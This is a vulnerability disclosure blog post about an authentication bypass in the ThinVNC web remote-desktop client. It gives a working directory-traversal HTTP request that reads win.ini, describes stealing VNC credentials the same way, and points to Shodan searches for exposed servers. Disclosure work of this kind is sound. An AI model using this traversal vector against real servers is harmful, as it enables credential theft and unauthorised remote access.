---
layout: post
title:  "ThinVNC Client Authentication Bypass"
date:   2019-10-15 18:05:55 +0300
image:  ThinVNC/title.png
author-name: jinxbox
tags:   [VNC, Auth Bypass, CVE]
---

<h2>Prologue:</h2>
In this blog post, I'll be writing few details about a vulnerability I found in ThinVNC. ThinVNC is a remote desktop client which works on web. I found an arbitrary file read vulnerability through which the authentication set can be bypassed. An attacker can gain remote terminal access abusing this vulnerability.

<h3> ThinVNC Application </h3>
ThinVNC can be downloaded from https://sourceforge.net/projects/thinvnc/ and the source code for this is available at https://github.com/bewest/thinvnc. According to it's author ThinVNC is a pure HTML5 & AJAX Remote Desktop implementation. ThinVNC works on any HTML5-compliant web browser. Users can access a remote PC from any computer or mobile OS; no additional plugin or installation will be required on the client side. 

<h3> Vulnerability Description </h3>
ThinVNC uses Basic Authentication to authenticate a user to access the web VNC interface. Credentials to be used are set on the server side while deploying the VNC server. There is no fixed port on which VNC server runs, you can run the VNC server on any port pre-configured.

A sample authentication screen looks like this:
[photo of auth-1]

When tried with multiple with wrong authentication credentials, it throws a HTTP 401 error. This can be bypassed using the following vector:
<b> /../../../../../../../../../windows/win.ini </b>

<h4>Sample Request:</h4>

GET /admin/../../../../../../../../../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 192.168.40.1:5888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

<h4>Sample Response: </h4>
HTTP/1.1 200
Content-Type: application/binary
Content-Length: 96
Connection: Keep-Alive

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
test
[insert BURP Screenshot here]
<br>

This directory traversal attack vector allows us to read any arbitrary file on the system. We can use the same vector to steal the credentials for the VNC client. Once we steal them, we can use the credentials to compromise the VNC server. Post compromise, we get terminal access to the VNC server.



<h3> POC: </h3>

<h3> ThinVNC in the wild  </h3>
There are roughly 800 accessible ThinVNC servers exposed over internet. You can use the following queries on Shondan and Zoomeye to identiify the vulnearble servers. 
[zoomeye ss]
[shodan ss]

SourceForge Page suggests that there are 208 downloads/week on an average. 


